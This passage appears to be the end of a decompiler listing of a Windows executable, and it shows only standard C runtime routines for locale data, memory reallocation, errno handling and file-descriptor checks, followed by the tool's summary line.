  if ( *a2 != dword_426F98 )
  {
    result = (struct __crt_locale_data *)dword_426758;
    if ( (dword_426758 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = (struct __crt_locale_data *)__acrt_update_thread_locale_data();
      *a2 = result;
    }
  }
  return result;
}
// 40E644: using guessed type int __acrt_update_thread_locale_data(void);
// 426758: using guessed type int dword_426758;

//----- (0040C12F) --------------------------------------------------------
void *__cdecl sub_40C12F(int a1, void **a2)
{
  void *result; // eax

  result = *a2;
  if ( *a2 != Block )
  {
    result = (void *)dword_426758;
    if ( (dword_426758 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = (void *)__acrt_update_thread_multibyte_data();
      *a2 = result;
    }
  }
  return result;
}
// 40D424: using guessed type int __acrt_update_thread_multibyte_data(void);
// 426758: using guessed type int dword_426758;

//----- (0040CE65) --------------------------------------------------------
int __thiscall sub_40CE65(_DWORD **this, void *Block)
{
  int v3; // edi

  v3 = unknown_libname_14();
  if ( v3 )
  {
    _free_base(Block);
    return v3;
  }
  else
  {
    *this[1]++ = Block;
    return 0;
  }
}
// 40CE9A: using guessed type int unknown_libname_14(void);

//----- (0040CF6F) --------------------------------------------------------
int __cdecl sub_40CF6F(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(
           &v3,
           a2,
           &v4);
}
// 40CF2C: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD);
// 40CF6F: using guessed type int var_8;

//----- (0040D87C) --------------------------------------------------------
char *__cdecl sub_40D87C(void *Block, unsigned int a2, unsigned int a3)
{
  size_t v4; // edi
  unsigned int v5; // esi
  char *v6; // ebx
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  savedregs = (int)&savedregs;
  if ( a2 && 0xFFFFFFE0 / a2 < a3 )
  {
    *_errno() = 12;
    return 0;
  }
  else
  {
    if ( Block )
      v4 = _msize(Block);
    else
      v4 = 0;
    v5 = a3 * a2;
    v6 = (char *)_realloc_base(Block, a3 * a2);
    if ( v6 )
    {
      if ( v4 < v5 )
        memset(&v6[v4], 0, v5 - v4);
    }
    return v6;
  }
}

//----- (0040D905) --------------------------------------------------------
char sub_40D905()
{
  hHeap = 0;
  return 1;
}

//----- (0040DA39) --------------------------------------------------------
int __cdecl sub_40DA39(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(
           &v3,
           a2,
           &v4);
}
// 40D9DF: using guessed type _DWORD __stdcall __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(_DWORD, _DWORD, _DWORD);
// 40DA39: using guessed type int var_8;

//----- (0040EDFB) --------------------------------------------------------
int __cdecl sub_40EDFB(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(
           &v3,
           a2,
           &v4);
}
// 40ED63: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(_DWORD, _DWORD, _DWORD);
// 40EDFB: using guessed type int var_8;

//----- (0040FE4F) --------------------------------------------------------
int __cdecl sub_40FE4F(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-Ch] BYREF
  int v4; // [esp+4h] [ebp-8h] BYREF

  v4 = a1;
  v3 = a1;
  return __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(
           &v3,
           a2,
           &v4);
}
// 40FDCD: using guessed type _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(_DWORD, _DWORD, _DWORD);
// 40FE4F: using guessed type int var_8;

//----- (0040FE77) --------------------------------------------------------
int __cdecl sub_40FE77(int a1)
{
  int *v2; // [esp+4h] [ebp-4h] BYREF

  if ( a1 == -2 )
  {
    *__doserrno() = 0;
    *_errno() = 9;
  }
  else
  {
    if ( a1 >= 0
      && a1 < (unsigned int)dword_4271A0
      && (*(_BYTE *)(dword_426FA0[a1 >> 6] + 48 * (a1 & 0x3F) + 40) & 1) != 0 )
    {
      v2 = &a1;
      return sub_40FE4F(a1, (int)&v2);
    }
    *__doserrno() = 0;
    *_errno() = 9;
    _invalid_parameter_noinfo();
  }
  return -1;
}
// 426FA0: using guessed type int dword_426FA0[124];
// 4271A0: using guessed type int dword_4271A0;

//----- (0040FFCD) --------------------------------------------------------
int sub_40FFCD()
{
  dword_427480 = IsProcessorFeaturePresent(0xAu);
  return 0;
}
// 427480: using guessed type int dword_427480;

//----- (00410264) --------------------------------------------------------
void __usercall sub_410264(char a1@<ch>, int a2@<ebp>)
{
  *(_BYTE *)(a2 - 144) = -2;
  if ( a1 && !isintTOS() )
    JUMPOUT(0x410623);
  _ffexpm1();
  JUMPOUT(0x410568);
}
// 4102B1: control flows out of bounds to 410568
// 4102D3: control flows out of bounds to 410623
// 4103BE: using guessed type int _ffexpm1(void);
// 410401: using guessed type int isintTOS(void);

//----- (00411F70) --------------------------------------------------------
void __cdecl sub_411F70()
{
  void *v0; // eax

  if ( HIDWORD(qword_4268F8) >= 8 )
  {
    v0 = (void *)lpBuffer;
    if ( (unsigned int)(2 * HIDWORD(qword_4268F8) + 2) >= 0x1000 )
    {
      if ( (unsigned int)lpBuffer - *((_DWORD *)lpBuffer - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v0 = (void *)*((_DWORD *)lpBuffer - 1);
    }
    sub_4060CB(v0);
  }
  qword_4268F8 = 0x700000000i64;
  LOWORD(lpBuffer) = 0;
}
// 4268F8: using guessed type __int64 qword_4268F8;

// nfuncs=511 queued=119 decompiled=119 lumina nreq=0 worse=0 better=0
// ALL OK, 119 function(s) have been successfully decompiled
